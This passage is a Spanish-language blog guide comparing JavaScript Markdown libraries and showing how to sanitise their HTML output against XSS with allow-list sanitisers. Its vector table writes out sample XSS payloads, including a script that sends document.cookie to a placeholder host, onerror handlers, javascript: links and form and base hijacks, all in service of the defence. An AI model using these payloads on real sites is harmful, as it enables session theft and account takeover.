---
title: "Renderizar Markdown en JavaScript sin enviar un agujero de seguridad"
description: "marked, markdown-it, unified, micromark y snarkdown comparados, con el patrón renderizar-y-luego-sanear que mantiene el XSS fuera del HTML que publicas."
updated: 2026-09-09
date: 2026-07-24
tag: Código
keywords: markdown a html javascript, marked js, markdown it, remark rehype, unified markdown, react markdown, comparativa parser markdown, micromark, snarkdown, plugins markdown-it, rehype-sanitize, dompurify markdown, renderizar markdown en streaming
---

Tres bibliotecas hacen la mayor parte del trabajo de Markdown a HTML en JavaScript, y responden a la
misma pregunta: dame Markdown, devuélveme HTML. Lo que las distingue es la forma — qué expone el
análisis y dónde te enganchas tú. Luego viene la parte que casi ningún tutorial cubre: lo que vuelve
es HTML, y meterlo en una página no es seguro.

La elección suele tomarse en cinco minutos, a partir de un resultado de búsqueda, y luego se vive con
ella cuatro años. Deja de ser barata en el momento en que alguien pide una tabla de contenidos, o que
los enlaces externos se abran en una pestaña nueva y los internos no, o un id de encabezado que
coincida con el ancla que un artículo de soporte ya enlaza. En ese punto la pregunta ya no es qué
analizador es más rápido. Es si la biblioteca te dio algo a lo que sujetarte.

Lo segundo que envejece mal es la entrada. Un renderizador que apunta a tu propia documentación es un
problema de renderizado. El mismo renderizador apuntando a una caja de comentarios, la descripción de
una pull request, un archivo que subió un cliente o la salida de un modelo de lenguaje es un problema
de seguridad, y ninguna de estas bibliotecas lo resuelve por ti — la más popular de todas lo dice en
su propio README.

### Resumen rápido

Usa **marked** cuando el trabajo es una cadena de entrada y una cadena de salida, y personalizar
significa sobrescribir unos cuantos métodos del renderizador. Usa **markdown-it** cuando quieras
conformidad con CommonMark más un plugin para cada extensión que te vayan a pedir con el tiempo, y la
capacidad de cambiar la salida de una sola etiqueta sin tocar el análisis. Usa **unified** —
`remark-parse`, `remark-rehype`, `rehype-stringify` — cuando necesites el documento como árbol, porque
es la única de las tres donde transformar el contenido no es cirugía de cadenas de texto. **micromark**
es el analizador debajo de remark y es la respuesta correcta solo si estás construyendo la capa que va
encima; **snarkdown** es un kilobyte y una serie de renuncias. Elijas lo que elijas, sanea el HTML
después con una herramienta cuyo único trabajo sea sanear.

## Tres formas, un solo trabajo

| Library | Best for | Spec position | How you extend it | In a browser | Licence |
| --- | --- | --- | --- | --- | --- |
| marked | Una función, pocas piezas móviles | GFM activado por defecto (`gfm: true`); sin declaración formal de conformidad en su README | `marked.use()` con un renderer, un tokenizer, extensiones propias, hooks y `walkTokens` | Sí — navegador, Node y un CLI, todo desde un paquete | Gratis, MIT |
| markdown-it | Corrección, y un plugin para todo | Declara 100 % de soporte de CommonMark, con un preajuste `commonmark` para el modo estricto | `.use(plugin)`, `.enable()` / `.disable()` por regla, y sobrescribir `md.renderer.rules[name]` | Sí | Gratis, MIT |
| unified (remark + rehype) | Transformar el documento, no solo renderizarlo | CommonMark vía micromark; GFM añadido por `remark-gfm` | Plugins que recorren dos árboles de sintaxis, mdast para Markdown y hast para HTML | Sí, y solo ESM | Gratis, MIT |
| micromark | Construir una capa de analizador, no una aplicación | Declara 100 % de conformidad con CommonMark y es el motor dentro de remark | Extensiones de sintaxis y de HTML, escritas contra códigos de carácter y tokens | Sí | Gratis, MIT |
| snarkdown | Un kilobyte, cuando aceptas lo que cuesta | Sin declaración de conformidad; las tablas no están soportadas | Prácticamente no extensible — una sola función exportada | Sí | Gratis, MIT |

(Licencias, opciones y declaraciones de conformidad comprobadas en marked.js.org, github.com y
cdn.jsdelivr.net, 9 de septiembre de 2026. No hay cifras de rendimiento en esa tabla a propósito: la
velocidad es lo que mide toda comparativa y lo que menos decide de estas elecciones.)

marked es lo más pequeño que funciona. Llamas a `marked.parse()`, obtienes HTML. Personalizarlo
significa sustituir métodos del renderer — el que emite un encabezado, el que emite un enlace — o
registrar una extensión para sintaxis nueva. La mayoría de trabajos nunca llegan a ese techo.

markdown-it analiza a un flujo plano de tokens y renderiza ese flujo. Los tokens están documentados,
así que el ecosistema de plugins es grande y los plugins se combinan: anclas, notas al pie, atributos,
contenedores. Para cambiar la salida en vez de la sintaxis, sobrescribes la regla de un tipo de token.

La tubería unified es de otra naturaleza. `remark-parse` produce mdast, un árbol de sintaxis de
Markdown; `remark-rehype` lo convierte en hast, un árbol de HTML; `rehype-stringify` lo imprime. Cada
paso entre ambos es un plugin que recorre un árbol real — la única de las tres donde puedes recolectar
cada encabezado, o reescribir rutas de imagen relativas, sin una expresión regular.

Otras dos merecen conocerse, en extremos opuestos. micromark es el analizador sobre el que se
construye remark: lee Markdown como códigos de carácter y emite tokens concretos con posiciones, y
declara conformidad completa con CommonMark. Lo usarías directamente para construir una herramienta
sobre Markdown — un linter, un formateador, un resaltador de sintaxis para un editor — en vez de para
renderizar una página, porque por sí solo te da tokens y un compilador, no un documento que puedas
recorrer. snarkdown es el otro extremo: una única función guiada por expresiones regulares, descrita
por su propio README como 1kb de ES3 comprimido, sin tablas y sin saneado (comprobado en github.com,
9 de septiembre de 2026). Existe para un widget donde el sentido entero es que no se envía nada más.

## Las bibliotecas en detalle

### marked — las opciones que importan

La API de marked es una llamada y un objeto de opciones, y solo un puñado de esas opciones cambia el
aspecto del HTML.

| Option | Default | What it does |
| --- | --- | --- |
| `gfm` | `true` | GitHub Flavored Markdown: tablas, tachado, listas de tareas, enlaces automáticos |
| `breaks` | `false` | Un solo salto de línea se vuelve un `<br>`, como se comporta un comentario de GitHub |
| `pedantic` | `false` | Sigue el `markdown.pl` original, errores incluidos, y renuncia a GFM para hacerlo |
| `async` | `false` | `walkTokens` puede ser asíncrono y `marked.parse()` devuelve una promesa |
| `silent` | `false` | Los errores vuelven como una cadena en vez de lanzarse |
| `renderer` | un `Renderer` | Las funciones que convierten cada token en HTML |
| `tokenizer` | un `Tokenizer` | Las funciones que convierten texto de origen en tokens |
| `walkTokens` | `null` | Se llama para cada token, hijos antes que hermanos |

(Comprobado en marked.js.org, 9 de septiembre de 2026.)

`breaks` es la opción que la gente entiende mal. La regla de Markdown dice que un solo salto de línea
es un espacio y una línea en blanco es un párrafo, lo cual es correcto para prosa e incorrecto para
cualquier cosa escrita en una caja de mensajes, donde alguien que pulsa Intro espera que la línea
termine. Activar `breaks` es una decisión sobre tus usuarios, no sobre la especificación. `pedantic`
es un interruptor de compatibilidad para documentos escritos contra la implementación de 2004, y no es
lo que quieres para nada escrito en esta década.

La trampa mayor son las opciones que ya no existen. marked ha movido una larga lista de
comportamientos fuera del núcleo y a paquetes aparte, y un fragmento copiado de una respuesta antigua
pasa una opción que se ignora en silencio en vez de rechazarse.

| Removed option | Where it went |
| --- | --- |
| `sanitize`, `sanitizer` | Eliminada a favor de un sanitizador de verdad: DOMPurify, sanitize-html o insane |
| `highlight`, `langPrefix` | `marked-highlight` |
| `headerIds`, `headerPrefix` | `marked-gfm-heading-id` |
| `mangle` | `marked-mangle` |
| `smartypants` | `marked-smartypants` |
| `baseUrl` | `marked-base-url` |
| `xhtml` | `marked-xhtml` |

(Comprobado en marked.js.org, 9 de septiembre de 2026.) La primera fila es la importante. Si tu código
pasa `sanitize: true` y crees que eso es tu defensa, no tienes defensa.

Personalizar la salida significa sobrescribir métodos del renderer. Cada uno recibe el token y
devuelve una cadena, y `this.parser` está disponible para renderizar los hijos del token.

```js
import { marked } from 'marked';

const slug = (text) =>
  `doc-${text.toLowerCase().trim().replace(/[^\w]+/g, '-').replace(/^-|-$/g, '')}`;

marked.use({
  renderer: {
    heading({ tokens, depth }) {
      const text = this.parser.parseInline(tokens);
      return `<h${depth} id="${slug(text)}">${text}</h${depth}>\n`;
    },
  },
});
```

El tokenizer es la misma idea una etapa antes: sobrescribe la función que reconoce un trozo de
sintaxis, devuelve `false` y marked cae al comportamiento por defecto. Usa el renderer para cambiar
cómo se emite algo y el tokenizer para cambiar qué cuenta como ese algo en primer lugar.

Para sintaxis que marked no conoce, registra una extensión: un `name`, un `level` de `block` o
`inline`, un `start` que diga dónde podría empezar el token, un `tokenizer` que lo produzca y un
`renderer` que lo imprima. Los hooks quedan fuera del análisis por completo — `preprocess` ve el
Markdown antes de tokenizar, `postprocess` ve el HTML después, y `processAllTokens` ve entre ambos todo
el array de tokens. Un hook `preprocess` es el sitio más ordenado para quitar el front matter YAML,
que de otro modo se renderiza como un párrafo de líneas `clave: valor` en la parte de arriba de la
página.

El resaltado de sintaxis es ahora `marked-highlight`, que envuelve el resaltador que elijas y añade
los nombres de clase al elemento `<code>`.

```js
import { Marked } from 'marked';
import { markedHighlight } from 'marked-highlight';
import hljs from 'highlight.js';

const marked = new Marked(
  markedHighlight({
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      const language = hljs.getLanguage(lang) ? lang : 'plaintext';
      return hljs.highlight(code, { language }).value;
    },
  }),
);
```

Dos cosas que notar. `langPrefix` es por defecto `language-`, así que una valla `js` produce
`class="language-js"` — y lo que espere tu hoja de estilos tiene que coincidir con eso, que es el
motivo habitual por el que el resaltado se aplica y queda invisible. Y el marcado que emite el
resaltador son elementos `<span>` con clases, que tu sanitizador tiene que permitir o eliminará el
resaltado otra vez después de que lo pagaras. [Lo que necesitan los bloques de código en la
página](/blog/code-blocks-in-markdown) cubre el resto de eso. Los resaltadores asíncronos funcionan si
fijas `async: true` y esperas el análisis. (`marked-highlight` es gratis y tiene licencia MIT; su valor
por defecto de `langPrefix` y su soporte asíncrono comprobados en github.com, 9 de septiembre de 2026.)

marked tiene licencia MIT, corre en un navegador, en Node y desde su propio CLI, y su README dice
claramente que no sanea su salida (comprobado en github.com, 9 de septiembre de 2026).

### markdown-it — preajustes, reglas y el ecosistema de plugins

markdown-it analiza a un flujo plano de tokens y renderiza ese flujo, y ambas mitades están abiertas.
Empieza desde un preajuste, y los preajustes difieren de formas que importan más de lo que sugieren
sus nombres.

| Preset | `html` | `maxNesting` | Rules enabled |
| --- | --- | --- | --- |
| `'default'` (o nada) | `false` | `100` | Todo lo que implementa markdown-it, incluidas tablas y tachado |
| `'commonmark'` | `true` | `20` | CommonMark estricto, nada más allá |
| `'zero'` | `false` | `20` | Solo párrafos y texto — activas el resto por nombre |

(Leído de los archivos de preajuste en cdn.jsdelivr.net, 9 de septiembre de 2026.)

Lee otra vez la columna del medio. `new MarkdownIt('commonmark')` activa el HTML crudo, porque la
especificación CommonMark dice que el HTML crudo pasa. Pedir el preajuste más estricto hace tu
renderizador menos seguro, no más, y es un resultado genuinamente sorprendente al que llegar elegiendo
la opción que suena más rigurosa.

El preajuste `zero` es lo contrario y se usa poco. Activa `paragraph`, `text` y las reglas que las
unen, y nada más; luego llamas a `md.enable(['emphasis', 'link', 'backticks'])` y tienes un
renderizador que demostrablemente no puede producir un encabezado ni una tabla. Para un nombre de
visualización, un mensaje de commit o un campo de comentario de una línea, esa es una respuesta mucho
mejor que un analizador completo seguido de un sanitizador agresivo.

Las opciones por encima de un preajuste:

| Option | Default | What it does |
| --- | --- | --- |
| `html` | `false` | Deja pasar el HTML crudo en vez de escaparlo |
| `xhtmlOut` | `false` | Emite `<br />` en vez de `<br>` |
| `breaks` | `false` | Un solo salto de línea se vuelve un `<br>` |
| `langPrefix` | `'language-'` | Prefijo de clase en los bloques de código con valla |
| `linkify` | `false` | Convierte URLs sueltas del texto en enlaces |
| `typographer` | `false` | Comillas tipográficas, rayas y otras sustituciones |
| `quotes` | comillas curvas | Qué caracteres de comilla sustituye `typographer` |
| `highlight` | `null` | Una función que devuelve HTML resaltado para un bloque de código |
| `maxNesting` | `100` (`20` en los preajustes estrictos) | Límite de recursión, para que un documento manipulado no agote la pila |

(Valores por defecto leídos de los mismos archivos de preajuste en cdn.jsdelivr.net, 9 de septiembre
de 2026.)

`linkify` es la opción que conviene pensar antes de activar. Reescribe texto que el autor no marcó
como enlace, lo que resulta conveniente en un mensaje de chat e incorrecto en documentación donde
`example.com/path` en medio de una frase se pensó para leerse, no para hacer clic. `typographer` es
parecido: cambia los caracteres de tu texto, lo que resulta agradable en un ensayo y destructivo en un
documento donde alguien escribió `--` porque significaba algo. Ninguna de las dos está activada por
defecto, y ambas merecen una decisión en vez de un valor por defecto.

`maxNesting` no es cosmético. El énfasis profundamente anidado o las citas son una entrada clásica de
denegación de servicio para un analizador recursivo, y un límite es lo que evita que un archivo de
4 KB se lleve consigo un hilo de petición.

El ecosistema de plugins es la razón real para elegir markdown-it. Su README apunta a la palabra clave
`markdown-it-plugin` en npm para los escritos por la comunidad (comprobado en github.com, 9 de
septiembre de 2026), y se combinan, porque todos extienden la misma cadena de reglas documentada:
notas al pie, listas de definición, contenedores (`::: warning`), atributos, anclas, tabla de
contenidos, listas de tareas, abreviaturas, emoji. Donde marked te pide escribir una extensión,
markdown-it suele tener ya una, y añadirla es una llamada a `.use()`. La calidad varía, y un plugin que
no se ha actualizado desde la última versión mayor es un coste real — compruébalo antes de construir
sobre él.

Para cambiar la salida en vez de la sintaxis, sobrescribe una regla del renderer. Este es el patrón
para añadir una clase o un atributo, y está documentado en la propia página de arquitectura del
proyecto:

```js
const defaultRender = md.renderer.rules.link_open || function (tokens, idx, options, env, self) {
  return self.renderToken(tokens, idx, options);
};

md.renderer.rules.link_open = function (tokens, idx, options, env, self) {
  tokens[idx].attrSet('target', '_blank');
  tokens[idx].attrSet('rel', 'noopener noreferrer');
  return defaultRender(tokens, idx, options, env, self);
};
```

(Patrón de la documentación de arquitectura de markdown-it, comprobado en github.com, 9 de septiembre
de 2026; la línea `rel` es la adición que quieres si vas a abrir un enlace en una pestaña nueva.)
Conserva la referencia a la regla anterior y llámala. Sobrescribir sin dejar que caiga al comportamiento
por defecto es cómo la gente pierde el atributo `title` y nunca lo nota, porque nada da error — el
atributo simplemente deja de aparecer.

markdown-it es gratis, tiene licencia MIT, y corre en un navegador. La propia documentación de
VS Code dice que su vista previa de Markdown apunta a CommonMark usando markdown-it (comprobado en
code.visualstudio.com, 9 de septiembre de 2026), lo cual es un aval justo de su conformidad y la razón
por la que un documento que se ve bien en la vista previa de tu editor es una buena señal y no una
garantía.

### unified — dos árboles y los plugins entre ellos

La tubería unified no es un analizador con hooks. Es una secuencia de paquetes pequeños, cada uno de
los cuales transforma un árbol, y entenderla significa entender que hay dos árboles.

**mdast** es el árbol de Markdown. Sus nodos son las cosas que tiene Markdown: `heading`, `list`,
`listItem`, `link`, `image`, `code`, `blockquote`, `text`. **hast** es el árbol de HTML. Sus nodos son
`element`, `text` y `comment`, con nombres de etiqueta y propiedades. Un encabezado en mdast tiene un
`depth` de 2; el mismo encabezado en hast es un `element` con `tagName: 'h2'`. Cualquier cosa que
quieras hacer en términos *del documento* — recolectar los encabezados, comprobar que cada enlace
resuelve, reescribir rutas de imagen relativas, exigir que cada imagen tenga texto alternativo — es un
trabajo de mdast. Cualquier cosa que quieras hacer en términos *del marcado* — añadir una clase,
envolver tablas en un contenedor con scroll, añadir `loading="lazy"` — es un trabajo de hast. Elegir el
árbol equivocado es la razón más común por la que un plugin unified se resiste.

| Step | Package | What comes out |
| --- | --- | --- |
| Analizar | `remark-parse` | mdast |
| Extender la sintaxis | `remark-gfm`, `remark-frontmatter`, `remark-math` | mdast |
| Transformar el contenido | tu propio plugin, `unist-util-visit` | mdast |
| Puente | `remark-rehype` | hast — el HTML crudo se descarta salvo que pases `allowDangerousHtml` |
| Reanalizar el HTML incrustado | `rehype-raw` | hast con ese HTML como nodos reales |
| Sanear | `rehype-sanitize` | hast, filtrado contra un esquema |
| Serializar | `rehype-stringify` | una cadena HTML |

Una tubería completa que acepta HTML crudo y sobrevive a él se ve así:

```js
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';

const processor = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeRaw)
  .use(rehypeSanitize)
  .use(rehypeStringify);

const html = String(await processor.process(markdown));
```

El orden es todo el modelo de seguridad. `remark-rehype` descarta el HTML crudo por defecto, lo cual es
seguro y normalmente no es lo que quieres; `allowDangerousHtml` lo conserva como un nodo crudo,
`rehype-raw` lo analiza en elementos reales tal como lo haría un navegador, y `rehype-sanitize` filtra
después esos elementos contra un esquema. La guía propia del proyecto es usarlo «después de lo último
que sea inseguro» (README de rehype-sanitize, comprobado en github.com, 9 de septiembre de 2026) — pon
un plugin que inyecte marcado después del sanitizador y lo has puesto fuera del sanitizador.
`rehype-sanitize` usa por defecto un esquema al estilo de GitHub, que es un punto de partida sensato y
deliberado: es el conjunto de etiquetas que GitHub mismo decidió permitir en un README.

`remark-gfm` añade cinco cosas y merece la pena nombrarlas, porque cada una es un fallo silencioso
concreto si falta: literales de enlace automático, notas al pie, tachado, tablas y listas de tareas.
Tiene licencia MIT, como el resto (comprobado en github.com, 9 de septiembre de 2026). Cuáles de esas
necesitan tus archivos es una pregunta sobre tus archivos, y las diferencias de dialecto detrás de ella
merecen leerse una vez.

La razón para asumir toda esta maquinaria es el centro de la tabla. Un plugin es una función que
devuelve un transformador, y a un transformador se le entrega el árbol:

```js
import { visit } from 'unist-util-visit';

const rewriteRelativeImages = (base) => () => (tree) => {
  visit(tree, 'image', (node) => {
    if (!/^[a-z][a-z0-9+.-]*:|^\/\//i.test(node.url)) {
      node.url = new URL(node.url, base).href;
    }
  });
};
```

Son nueve líneas, es correcto para cada imagen del documento incluidas las que están dentro de texto
de enlace y celdas de tabla, y no hay versión de esto en marked o markdown-it que no implique
interceptar un método del renderer nodo por nodo o ejecutar una expresión regular sobre HTML ya
terminado. Cuando la tarea es «hacer algo con cada X del documento», un árbol no es la respuesta más
pesada, es la única que no se rompe tarde o temprano en un caso que no consideraste.

Los costes son reales y se cubren más abajo. Uno de ellos merece señalarse aquí: los paquetes unified
declaran que son solo ESM (comprobado en github.com, 9 de septiembre de 2026), lo cual es un bloqueo
directo en una compilación CommonJS antigua que no puede usar un `import()` dinámico.

### react-markdown — la tubería, renderizada como componentes

En React, `react-markdown` se apoya en la tubería unified y renderiza elementos React en vez de una
cadena HTML, así que no interviene `dangerouslySetInnerHTML`. Su README declara que es seguro por
defecto y construye un DOM virtual a partir del árbol de sintaxis, así que React solo aplica el parche
de lo que cambió (comprobado en github.com, 9 de septiembre de 2026). Tiene licencia MIT.

```jsx
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

<Markdown
  remarkPlugins={[remarkGfm]}
  components={{
    a: ({ href, children }) => <Link to={href}>{children}</Link>,
    code: CodeBlock,
  }}
>
  {text}
</Markdown>;
```

La propiedad `components` es la parte que se lo merece. Cada elemento HTML que la tubería habría
producido se puede sustituir por uno tuyo, así que un enlace se convierte en el enlace de tu router,
una valla de código se convierte en tu bloque resaltado con un botón de copiar, y una imagen se
convierte en tu componente de carga diferida — sin generar HTML y volverlo a analizar. `remarkPlugins`
y `rehypePlugins` toman los mismos plugins que cualquier otra tubería unified, con opciones pasadas
como `[[plugin, options]]`.

Dos avisos de seguridad, ambos de la propia documentación del proyecto. El HTML crudo del origen se
ignora salvo que añadas `rehype-raw`, y su guía es hacerlo solo si confías en el Markdown; añadir
`rehype-sanitize` junto a él es la respuesta cuando no confías. Y `urlTransform` — el hook que decide
en qué se convierte una URL de enlace o de imagen — es el único sitio donde puedes reintroducir un
agujero de XSS en un componente por lo demás seguro, sobrescribiéndolo con algo que deje pasar
`javascript:`.

### MDX — algo completamente distinto

MDX parece el siguiente paso después de react-markdown y no está en el mismo eje en absoluto. MDX es
un formato de archivo que combina Markdown con JSX y las instrucciones ESM `import` y `export`, y
compila a un componente de JavaScript (comprobado en mdxjs.com, 9 de septiembre de 2026). El resultado
es código.

Esa distinción decide todo sobre dónde encaja. Un renderizador de Markdown toma texto en tiempo de
ejecución y produce marcado; MDX toma un archivo de origen en tiempo de compilación y produce un
módulo que se ejecuta. Sanear no es un paso en una tubería MDX porque no hay nada que sanear — el
archivo estaba autorizado a ejecutarse por diseño. MDX es la herramienta correcta para documentación y
páginas de marketing que viven en tu repositorio y necesitan componentes interactivos en medio de la
prosa, que es por lo que los frameworks de documentación lo usan — Docusaurus compila tanto `.md` como
`.mdx` con el compilador de MDX (comprobado en docusaurus.io, 9 de septiembre de 2026). Es
categóricamente la herramienta equivocada para cualquier contenido que llegue de un usuario, un
cliente, una API o un modelo. Si el origen no lo escribió alguien con acceso de commit, MDX no está en
la contienda, y ninguna bandera de configuración cambia esa respuesta.

## Cuál es la mejor respuesta

La pregunta que las separa no es la velocidad, es si algún día necesitarás el documento como datos.
Para Markdown de confianza que se renderiza en una página y nada más, marked o markdown-it bastan.
Para una tabla de contenidos, comprobación de enlaces o cualquier transformación que dependa de la
estructura, remark y rehype son la respuesta correcta, y las otras dos se convierten en cirugía de
cadenas de texto. Lo que cuesta adivinar mal en la otra dirección tiene su propia sección más abajo.

Sus valores por defecto difieren en dialecto, lo cual aparece como salida que falta, no como un error.
marked tiene GitHub Flavored Markdown detrás de una opción `gfm`, activada por defecto. markdown-it
activa tablas y tachado en su preajuste por defecto pero deja las listas de tareas a un plugin.
unified lo toma todo de `remark-gfm`. Si un documento llega sin sus tablas o sus listas de tareas,
comprueba primero el dialecto — ver [CommonMark, GFM y los dialectos](/blog/commonmark-gfm-and-the-flavours).

Dicho como tabla de referencia, porque la mayoría de estas decisiones caben en una línea:

| What you are building | Reach for |
| --- | --- |
| Una caja de comentarios, un panel de vista previa, una burbuja de chat | marked, con un sanitizador |
| Un README renderizado en tu propia app | marked o markdown-it, lo que ya esté ahí |
| Una compilación de documentación que añade anclas, contenedores y notas al pie | markdown-it, y sus plugins |
| Un campo de una sola línea: un nombre de visualización, el asunto de un commit | markdown-it con el preajuste `zero` y tres reglas activadas |
| Una tabla de contenidos, comprobación de enlaces, linting de estilo de la casa | unified, sobre mdast |
| Reescribir URLs, añadir clases, envolver elementos | unified, sobre hast |
| Una aplicación React | react-markdown, con `components` |
| Prosa con componentes interactivos, escrita por tu propio equipo | MDX, en tiempo de compilación |
| Un widget donde el peso del paquete es la restricción | snarkdown, sabiendo qué no hace |
| Un linter o formateador sobre Markdown mismo | micromark, o mdast directamente |

## El agujero: analizar no es sanear

Markdown permite HTML crudo por diseño, así que cualquier analizador que respete la especificación
deja pasar `<img src=x onerror=alert(1)>` directo a tu página. marked antes tenía una opción
`sanitize`; se marcó obsoleta y luego se eliminó a favor de un sanitizador dedicado. markdown-it usa
por defecto `html: false`, que cierra la puerta más ancha, pero el destino de un enlace sigue siendo
la entrada de un atacante.

Las tres bibliotecas toman tres posturas sobre esto, y ninguna es «nosotros nos encargamos»:

| | marked | markdown-it | unified (remark + rehype) |
| --- | --- | --- | --- |
| Salida | Una cadena HTML | Una cadena HTML, vía tokens | Un árbol, serializado al final |
| HTML crudo | Se deja pasar | Se escapa por defecto (`html: false`), pasa en el preajuste `commonmark` | Se descarta salvo `allowDangerousHtml` y `rehype-raw` |
| Saneado | Ninguno | Ninguno | `rehype-sanitize`, si lo añades |
| Qué dice el proyecto | Usa DOMPurify, sanitize-html o insane sobre el HTML de salida | Nada se escapa en cuanto fijas `html: true` — y el preajuste `commonmark` lo fija | `allowDangerousHtml` es peligroso; usa `rehype-sanitize` después |

Así que: renderiza, luego sanea con una herramienta cuyo único trabajo sea sanear, siempre en ese
orden.

La razón por la que el orden no es negociable es que sanear el origen Markdown no funciona. Markdown
tiene demasiadas formas de escribir el mismo resultado — enlaces de referencia, escapes de entidad,
enlaces automáticos, comentarios HTML — así que un filtro sobre el origen es un filtro sobre una sola
forma de escribirlo. El HTML es la única representación donde lo que estás decidiendo es inequívoco,
porque es lo que de verdad se le va a entregar al navegador.

Lo que un sanitizador tiene que detener es una lista más larga de la que la mayoría lleva en la
cabeza:

| Vector | What it looks like | What stops it |
| --- | --- | --- |
| Elemento script | `<script>fetch('//x/'+document.cookie)</script>` | `script` no está en la lista blanca de etiquetas |
| Atributo manejador de evento | `<img src=x onerror=alert(1)>` | `on*` no está en la lista blanca de atributos |
| URL `javascript:` | `[click me](javascript:alert(1))` | Una lista blanca de esquemas en `href` y `src` |
| URL `data:` con marcado dentro | `<iframe src="data:text/html,<script>…">` | `iframe` apagado; lista blanca de esquemas en `src` |
| SVG con script o manejadores | `<svg><script>…</script></svg>` | SVG apagado salvo que de verdad necesites SVG en línea |
| Estilo en línea y CSS que trae recursos | `<div style="background:url(//x)">` | Descarta `style`, conserva `class` |
| Formulario que envía a otro sitio | `<form action="//x"><input name=pw>` | `form`, `input`, `button` fuera de la lista |
| `<base>` que reescribe cada enlace relativo | `<base href="//x/">` | `base` fuera de la lista |
| `meta refresh` que redirige la página | `<meta http-equiv=refresh content=…>` | `meta` fuera de la lista |
| DOM clobbering vía `id` o `name` | `<a id="config">` que sombrea un global | Prefijar los ids, o eliminarlos |
| Anidamiento suficientemente profundo para agotar la pila | Centenares de citas anidadas | Un límite de anidamiento en el analizador, antes del sanitizador |

El argumento completo para construir esto como lista blanca en vez de lista negra es un artículo
aparte; la versión corta es que una lista negra es una lista de los ataques que alguien ya pensó.

### Qué sanitizador, y dónde encaja

| Sanitiser | Runs where | Needs a DOM | Configured with | Licence |
| --- | --- | --- | --- | --- |
| DOMPurify | Nativo en el navegador; en Node con jsdom | Sí | `ALLOWED_TAGS`, `ALLOWED_ATTR`, `USE_PROFILES`, hooks | Gratis, Apache-2.0 o MPL-2.0 |
| sanitize-html | Node, y empaquetado para el navegador | No — analiza con htmlparser2 | `allowedTags`, `allowedAttributes`, `allowedSchemes`, `transformTags` | Gratis, MIT |
| rehype-sanitize | Donde corra unified | No — filtra hast | Un esquema, al estilo de GitHub por defecto | Gratis, MIT |

(Licencias y opciones de configuración comprobadas en github.com, 9 de septiembre de 2026. El
repositorio independiente de sanitize-html se archivó en febrero de 2026 y el paquete se movió al
monorepo de ApostropheCMS, algo que vale la pena saber antes de abrir un issue contra el antiguo.)

Elige según dónde corre el código, no según reputación. DOMPurify es la respuesta correcta en un
navegador, donde usa el propio analizador del navegador y por lo tanto ve exactamente lo que va a ver
el navegador — incluida la recuperación deformada que hace un analizador real ante marcado roto, que
es justo donde pierde un filtro que compara cadenas de texto. Tiene hooks, y `SANITIZE_NAMED_PROPS`
contra el DOM clobbering. rehype-sanitize es la respuesta correcta si ya tienes una tubería unified,
porque filtra el árbol en el sitio y nunca hay un momento en que el HTML inseguro exista como cadena.
sanitize-html es la respuesta correcta cuando necesitas una implementación que se comporte igual en
Node y en el navegador sin una implementación de DOM debajo.

## Renderizar, luego sanear, en el navegador

DOMPurify es la elección estándar. Dale una lista blanca explícita en vez de la predeterminada: la
lista blanca es el formato de documento que decidiste soportar.

```js
import { marked } from 'marked';
import DOMPurify from 'dompurify';

export const ALLOWED_TAGS = [
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'br', 'hr', 'strong', 'em', 'del',
  'ul', 'ol', 'li', 'blockquote', 'pre', 'code', 'table', 'thead', 'tbody',
  'tr', 'th', 'td', 'a', 'img', 'input',
];

export const ALLOWED_ATTR = [
  'href', 'src', 'alt', 'title', 'id', 'class', 'target', 'rel',
  'type', 'checked', 'disabled', 'colspan', 'rowspan',
];

export function render(markdown) {
  const html = marked.parse(markdown, { gfm: true });
  return DOMPurify.sanitize(html, { ALLOWED_TAGS, ALLOWED_ATTR });
}
```

Mantén los dos arrays en un módulo y expórtalos. En el momento en que el mismo documento se renderice
en otro sitio, tienen que coincidir exactamente.

### La misma lista blanca en el servidor

DOMPurify necesita un DOM real y el servidor no tiene ninguno. Un sustituto pobre es peor que nada:
sin un DOM utilizable, DOMPurify devuelve la entrada sin cambios en vez de lanzar un error, etiqueta
script incluida. O le das jsdom, o usas un sanitizador que analice el HTML por sí mismo, como `xss`.

```js
import { marked } from 'marked';
import { FilterXSS } from 'xss';
import { ALLOWED_ATTR, ALLOWED_TAGS } from './allow-list.js';

const filter = new FilterXSS({
  whiteList: Object.fromEntries(ALLOWED_TAGS.map((tag) => [tag, [...ALLOWED_ATTR]])),
  stripIgnoreTag: true,
  stripIgnoreTagBody: ['script', 'style', 'iframe', 'object', 'embed'],
});

export const render = (markdown) =>
  filter.process(marked.parse(markdown, { gfm: true }));
```

`stripIgnoreTag` elimina una etiqueta desconocida en vez de escaparla, que es el comportamiento por
defecto; `stripIgnoreTagBody` se lleva también su contenido, así que un `<script>` eliminado no deja
código detrás. El paquete `xss` es gratis, tiene licencia MIT, y analiza el HTML por sí mismo en vez de
pedir un DOM, lo cual lo hace usable en una función sin jsdom (`FilterXSS`, `whiteList`,
`stripIgnoreTag` y `stripIgnoreTagBody` comprobados en github.com, 9 de septiembre de 2026).

Así está construido TransformPipe: marked para el análisis, DOMPurify en el navegador, el paquete
`xss` en el servidor, una sola lista blanca importada por ambos, así que un documento se lee igual en
la app y en una página compartida. Un detalle que vale la pena copiar: los ids de encabezado llevan un
prefijo `doc-`. Un id se convierte en una propiedad con nombre en `window`, y DOMPurify elimina los ids
que parecen un riesgo de clobbering mientras que un sanitizador basado en analizador los conserva — el
prefijo termina con los dos problemas a la vez. El argumento a favor de las listas blancas está en
[sanear Markdown de forma segura](/blog/sanitising-markdown-safely); los mismos dos pasos en Python
están en [Markdown a HTML en Python](/blog/markdown-to-html-in-python).

## Renderizar la salida de un modelo mientras llega en streaming

La mitad del Markdown que se renderiza hoy en un navegador llega unos cuantos caracteres a la vez,
desde un modelo, por un flujo. Todo enfoque ingenuo para esto es el mismo enfoque: añade el trozo a un
buffer, vuelve a renderizar el buffer entero, fija `innerHTML`. Funciona en una demo y falla de cuatro
formas concretas.

**El documento es sintácticamente inválido casi todo el tiempo.** Markdown no tiene análisis parcial.
Un buffer que termina en el inicio de una valla significa que todo lo que viene después es un bloque
